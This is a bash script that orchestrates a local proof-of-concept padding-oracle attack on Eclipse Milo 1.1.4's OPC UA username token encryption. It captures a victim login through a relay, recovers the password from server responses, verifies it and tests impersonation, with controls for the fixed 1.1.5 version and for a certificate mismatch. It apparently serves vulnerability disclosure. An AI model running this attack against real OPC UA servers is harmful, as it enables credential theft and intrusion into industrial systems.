#!/usr/bin/env bash
# the padding oracle PoC orchestrator.
#
# Five SEPARATE JVM processes, launched below with their exact argv visible in this script:
#   ServerMain    (holds the password -- it must, to authenticate the victim)
#   VictimMain    (holds the password -- it is the legitimate user)
#   RelayMain     (a "dumb pipe": records raw bytes in both directions, NO protocol parsing,
#                  NO extraction of anything -- just two raw byte-stream files)
#   AttackerMain  (receives ONLY host/port and the two raw capture files -- NEVER the password,
#                  by any channel: not argv, not env, not a file it reads, not a system property.
#                  Holds no private key. Parses the raw capture ITSELF to pull out the username,
#                  policyId, ciphertext, and the certificate the capture was made against. Every
#                  padding decision comes from a real remote ActivateSession response.)
#   VerifierMain  (receives the ground-truth password directly from THIS script, and the
#                  attacker's recovered value from a file; compares the two AFTER the fact)
#
# Usage:
#   ./run.sh                      # vulnerable (milo.version=1.1.4): full recovery + impersonation
#   ./run.sh --fixed              # fixed (milo.version=1.1.5): oracle-closed, refuses to recover
#   ./run.sh --cert-mismatch-demo # vulnerable: attacker refuses a capture bound to a DIFFERENT server
#
# Env overrides:
#   MILO_VERSION         overrides --fixed/--vulnerable directly
#   ATTEMPT_MAX_RUNTIME   per-attempt attacker wall-clock budget in seconds (default 90)
#   ATTEMPT_MAX_COUNT     max number of resume attempts before giving up (default 40)
#   JAVA_HOME             if unset, resolved the same way as before (mise install dir, then
#                         /usr/libexec/java_home -v 17, then PATH)
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"

MODE="vulnerable"
MILO_VERSION="${MILO_VERSION:-1.1.4}"
for arg in "$@"; do
  case "$arg" in
    --fixed) MODE="fixed"; MILO_VERSION="1.1.5" ;;
    --vulnerable) MODE="vulnerable"; MILO_VERSION="1.1.4" ;;
    --cert-mismatch-demo) MODE="cert-mismatch-demo"; MILO_VERSION="1.1.4" ;;
    *)
      echo "unknown argument: $arg" >&2
      echo "usage: $0 [--fixed|--vulnerable|--cert-mismatch-demo]" >&2
      exit 64
      ;;
  esac
done

ATTEMPT_MAX_RUNTIME="${ATTEMPT_MAX_RUNTIME:-90}"
ATTEMPT_MAX_COUNT="${ATTEMPT_MAX_COUNT:-40}"

# ---------------------------------------------------------------------------------------------
# Toolchain resolution (does not rely on mise's directory-scoped config -- mise only knows which
# JDK to hand back inside a directory carrying its own .mise.toml, which this standalone project
# intentionally does not have -- so we search mise's install directory directly).
# ---------------------------------------------------------------------------------------------
if [ -z "${JAVA_HOME:-}" ]; then
  if command -v mise >/dev/null 2>&1; then
    MISE_JAVA_DIR="$(ls -d "$HOME"/.local/share/mise/installs/java/temurin-17.* 2>/dev/null | sort -V | tail -1)"
    if [ -n "$MISE_JAVA_DIR" ] && [ -x "$MISE_JAVA_DIR/bin/java" ]; then
      JAVA_HOME="$MISE_JAVA_DIR"
    fi
  fi
fi
if [ -z "${JAVA_HOME:-}" ] && command -v /usr/libexec/java_home >/dev/null 2>&1; then
  JAVA_HOME="$(/usr/libexec/java_home -v 17 2>/dev/null || true)"
fi
if [ -n "${JAVA_HOME:-}" ]; then
  export JAVA_HOME
  export PATH="$JAVA_HOME/bin:$PATH"
fi
if ! command -v java >/dev/null 2>&1; then
  echo "error: no JDK 17 found. Set JAVA_HOME explicitly, or install one (developed against" >&2
  echo "       Temurin 17.0.19 via mise: 'mise install java@temurin-17')." >&2
  exit 1
fi
echo "==> Using $(command -v java) ($(java -version 2>&1 | head -1))"

MVN="$(command -v mvn || true)"
if [ -z "$MVN" ] && command -v mise >/dev/null 2>&1; then
  MVN="mise exec -- mvn"
fi
if [ -z "$MVN" ]; then
  echo "error: no 'mvn' found on PATH and mise is unavailable" >&2
  exit 1
fi

echo "==> Building against org.eclipse.milo:*:${MILO_VERSION} ..."
$MVN -q -f "$SCRIPT_DIR/pom.xml" clean package -DskipTests -Dmilo.version="$MILO_VERSION"

JAR="$SCRIPT_DIR/target/padding-oracle-poc.jar"
if [ ! -f "$JAR" ]; then
  echo "error: expected shaded jar not found at $JAR" >&2
  exit 1
fi
JAR_SHA256="$(shasum -a 256 "$JAR" 2>/dev/null | cut -d' ' -f1 || sha256sum "$JAR" | cut -d' ' -f1)"
echo "==> Shaded jar: $JAR"
echo "    milo.version=${MILO_VERSION}  sha256=${JAR_SHA256}"

RUNDIR="$(mktemp -d "${TMPDIR:-/tmp}/padding-oracle-poc.XXXXXX")"
echo "==> Working directory: $RUNDIR"

USERNAME="victim"
POLICY_ID="username_rsa15"

wait_for_file() {
  local f="$1" timeout="$2" waited=0
  while [ ! -s "$f" ]; do
    sleep 0.2
    waited=$((waited + 1))
    if [ "$waited" -gt $((timeout * 5)) ]; then
      echo "error: timed out waiting for $f" >&2
      return 1
    fi
  done
}

SERVER_PIDS=()
cleanup() {
  for pid in "${SERVER_PIDS[@]:-}"; do
    kill "$pid" >/dev/null 2>&1 || true
  done
}
trap cleanup EXIT

start_server() {
  local info_file="$1" label="$2"
  java -cp "$JAR" poc.ServerMain \
    --username "$USERNAME" --password "$PASSWORD" --policy-id "$POLICY_ID" \
    --info-file "$info_file" \
    >"$RUNDIR/server-$label.log" 2>&1 &
  SERVER_PIDS+=("$!")
  wait_for_file "$info_file" 30
}

# Generates a random victim password AT RUNTIME. Never a source constant. Held by this script,
# ServerMain (to authenticate), VictimMain (the legitimate user), and VerifierMain (ground truth
# for the final comparison) -- and by nothing else, in particular NOT by AttackerMain.
# (pipefail is disabled for this one line: `head -c` closing its input early makes the upstream
# `tr` exit via SIGPIPE, which pipefail would otherwise surface as a spurious failure under -e.)
set +o pipefail
PASSWORD="$(LC_ALL=C tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 20)"
set -o pipefail
echo "==> Generated a random victim password at runtime (not printed; not a source constant; length=${#PASSWORD})"

run_attack_flow() {
  local server_info="$RUNDIR/server-info.properties"
  local relay_info="$RUNDIR/relay-info.properties"
  local c2s_raw="$RUNDIR/capture-c2s.raw"
  local s2c_raw="$RUNDIR/capture-s2c.raw"
  local checkpoint="$RUNDIR/checkpoint.properties"
  local out="$RUNDIR/recovered.properties"

  echo "==> [1/5] Starting server ..."
  start_server "$server_info" "main" || { echo "error: server failed to start; see $RUNDIR/server-main.log" >&2; return 1; }
  local server_port server_cert
  server_port="$(grep '^port=' "$server_info" | cut -d= -f2)"
  server_cert="$(grep '^certFingerprint=' "$server_info" | cut -d= -f2)"
  echo "    server port=$server_port, cert SHA-256=$server_cert"

  echo "==> [2/5] Starting recording relay (dumb pipe -- no protocol parsing) ..."
  java -cp "$JAR" poc.RelayMain \
    --target-host localhost --target-port "$server_port" \
    --capture-c2s-file "$c2s_raw" --capture-s2c-file "$s2c_raw" --listen-info-file "$relay_info" \
    >"$RUNDIR/relay.log" 2>&1 &
  local relay_pid=$!
  wait_for_file "$relay_info" 15 || { echo "error: relay never started listening; see $RUNDIR/relay.log" >&2; cat "$RUNDIR/relay.log" >&2; return 1; }
  local relay_port
  relay_port="$(grep '^port=' "$relay_info" | cut -d= -f2)"
  echo "    relay listening on localhost:$relay_port"

  echo "==> [3/5] Running victim through the relay ..."
  java -cp "$JAR" poc.VictimMain \
    --endpoint-url "opc.tcp://localhost:$relay_port/test" \
    --username "$USERNAME" --password "$PASSWORD" --policy-id "$POLICY_ID" \
    >"$RUNDIR/victim.log" 2>&1 || { echo "error: victim failed; see $RUNDIR/victim.log" >&2; cat "$RUNDIR/victim.log" >&2; return 1; }
  wait "$relay_pid" || { echo "error: relay failed; see $RUNDIR/relay.log" >&2; cat "$RUNDIR/relay.log" >&2; return 1; }
  cat "$RUNDIR/relay.log"

  # Isolation self-check: the raw capture files the attacker will parse must not contain the
  # password in any recognizable form (it never should -- it's RSA-encrypted before the victim
  # even sends it -- but this is a live, mechanical check, not just an assertion).
  if grep -aq -- "$PASSWORD" "$c2s_raw" "$s2c_raw" 2>/dev/null; then
    echo "FATAL: raw capture unexpectedly contains the victim password -- aborting" >&2
    return 1
  fi
  echo "==> Isolation self-check: raw capture files do not contain the victim password (verified by grep)"

  echo "==> [4/5] Running attacker (parses the raw capture itself; checkpointed; resumes across attempts) ..."
  local attempt=1 attacker_status=5
  while [ "$attempt" -le "$ATTEMPT_MAX_COUNT" ]; do
    echo "    --- attacker attempt $attempt/$ATTEMPT_MAX_COUNT (max-runtime=${ATTEMPT_MAX_RUNTIME}s) ---"
    # NOTE the argv below is the COMPLETE, exact command line the attacker process runs with:
    # host, port, capture-c2s-file, capture-s2c-file, checkpoint-file, max-runtime, out-file.
    # There is no --password flag, no --username/--policy-id (it derives those itself from the
    # raw capture), no PASSWORD environment variable, and no system property.
    set +e
    java -cp "$JAR" poc.AttackerMain \
      --host localhost --port "$server_port" \
      --capture-c2s-file "$c2s_raw" --capture-s2c-file "$s2c_raw" \
      --checkpoint-file "$checkpoint" \
      --max-runtime "$ATTEMPT_MAX_RUNTIME" \
      --out-file "$out"
    attacker_status=$?
    set -e
    if [ "$attacker_status" -ne 5 ]; then
      break
    fi
    attempt=$((attempt + 1))
  done

  echo "==> [5/5] Verifying (only this step ever compares recovered-vs-actual) ..."
  case "$attacker_status" in
    0)
      java -cp "$JAR" poc.VerifierMain --expected "$PASSWORD" --attacker-out-file "$out"
      print_summary "$out"
      ;;
    4)
      echo "[+] Attacker correctly reported the target as NOT VULNERABLE and refused to attempt recovery."
      echo ""
      echo "Captured one encrypted OPC UA login"
      echo "Fixed 1.1.5: ORACLE CLOSED"
      ;;
    3)
      echo "[+] Attacker correctly REFUSED due to a certificate-fingerprint mismatch."
      ;;
    *)
      echo "[-] Attacker did not complete successfully (exit $attacker_status); see logs in $RUNDIR"
      ;;
  esac

  return "$attacker_status"
}

# One concise, screenshot-friendly summary of a successful run, from the attacker's own
# recovered.properties (queries/wallSeconds/impersonation/wrongPasswordDenied) plus the
# verifier's independent PASS/FAIL already printed above.
print_summary() {
  local out_file="$1"
  local queries wall_seconds wrong_denied impersonation
  queries="$(grep '^queries=' "$out_file" | cut -d= -f2)"
  wall_seconds="$(grep '^wallSeconds=' "$out_file" | cut -d= -f2)"
  wrong_denied="$(grep '^wrongPasswordDenied=' "$out_file" | cut -d= -f2)"
  impersonation="$(grep '^impersonation=' "$out_file" | cut -d= -f2)"
  echo ""
  echo "Captured one encrypted OPC UA login"
  echo "Recovered plaintext password in ${queries} requests / ${wall_seconds} seconds"
  if [ "$wrong_denied" = "true" ]; then
    echo "Wrong password: DENIED"
  else
    echo "Wrong password: NOT DENIED (unexpected)"
  fi
  if [ "$impersonation" = "Good" ]; then
    echo "Recovered password: LOGIN SUCCESSFUL"
  else
    echo "Recovered password: LOGIN FAILED (unexpected)"
  fi
}

run_cert_mismatch_demo() {
  echo "==> Certificate-binding control demo: capture a token against server A, then point the"
  echo "    attacker at a FRESH server B (different self-signed key) using server A's capture."
  local server_info_a="$RUNDIR/server-a-info.properties"
  local server_info_b="$RUNDIR/server-b-info.properties"
  local relay_info="$RUNDIR/relay-info.properties"
  local c2s_raw="$RUNDIR/capture-c2s.raw"
  local s2c_raw="$RUNDIR/capture-s2c.raw"

  start_server "$server_info_a" "a" || { echo "error: server A failed to start" >&2; return 1; }
  local port_a
  port_a="$(grep '^port=' "$server_info_a" | cut -d= -f2)"
  echo "    server A port=$port_a, cert=$(grep '^certFingerprint=' "$server_info_a" | cut -d= -f2)"

  java -cp "$JAR" poc.RelayMain --target-host localhost --target-port "$port_a" \
    --capture-c2s-file "$c2s_raw" --capture-s2c-file "$s2c_raw" --listen-info-file "$relay_info" \
    >"$RUNDIR/relay.log" 2>&1 &
  local relay_pid=$!
  wait_for_file "$relay_info" 15 || { echo "error: relay never started listening" >&2; cat "$RUNDIR/relay.log" >&2; return 1; }
  local relay_port
  relay_port="$(grep '^port=' "$relay_info" | cut -d= -f2)"
  java -cp "$JAR" poc.VictimMain --endpoint-url "opc.tcp://localhost:$relay_port/test" \
    --username "$USERNAME" --password "$PASSWORD" --policy-id "$POLICY_ID" \
    >"$RUNDIR/victim.log" 2>&1 || { echo "error: victim failed; see $RUNDIR/victim.log" >&2; cat "$RUNDIR/victim.log" >&2; return 1; }
  wait "$relay_pid" || { echo "error: relay failed; see $RUNDIR/relay.log" >&2; cat "$RUNDIR/relay.log" >&2; return 1; }
  cat "$RUNDIR/relay.log"

  echo "==> Starting a SECOND, independent server B (fresh self-signed key) ..."
  start_server "$server_info_b" "b" || { echo "error: server B failed to start" >&2; return 1; }
  local port_b
  port_b="$(grep '^port=' "$server_info_b" | cut -d= -f2)"
  echo "    server B port=$port_b, cert=$(grep '^certFingerprint=' "$server_info_b" | cut -d= -f2)"

  echo "==> Pointing the attacker at server B using the capture from server A (expect REFUSAL) ..."
  set +e
  java -cp "$JAR" poc.AttackerMain \
    --host localhost --port "$port_b" \
    --capture-c2s-file "$c2s_raw" --capture-s2c-file "$s2c_raw" \
    --checkpoint-file "$RUNDIR/checkpoint-mismatch.properties" \
    --max-runtime 10 \
    --out-file "$RUNDIR/recovered-mismatch.properties"
  local status=$?
  set -e
  if [ "$status" -eq 3 ]; then
    echo "[+] CONTROL PASSED: attacker refused the mismatched capture (exit 3)"
  else
    echo "[-] CONTROL FAILED: expected exit 3 (cert mismatch refusal), got $status"
  fi
  return "$status"
}

STATUS=1
case "$MODE" in
  vulnerable|fixed) run_attack_flow && STATUS=0 || STATUS=$? ;;
  cert-mismatch-demo) run_cert_mismatch_demo && STATUS=0 || STATUS=$? ;;
esac

echo ""
echo "==> Environment: $(uname -srm), $(java -version 2>&1 | head -1)"
echo "==> Run directory retained at: $RUNDIR"
case "$STATUS" in
  0) echo "==> exit 0: succeeded" ;;
  3) echo "==> exit 3: refused due to certificate-fingerprint mismatch" ;;
  4) echo "==> exit 4: oracle closed / not vulnerable -- refused to attempt recovery" ;;
  *) echo "==> exit $STATUS: see logs in $RUNDIR" ;;
esac
exit "$STATUS"
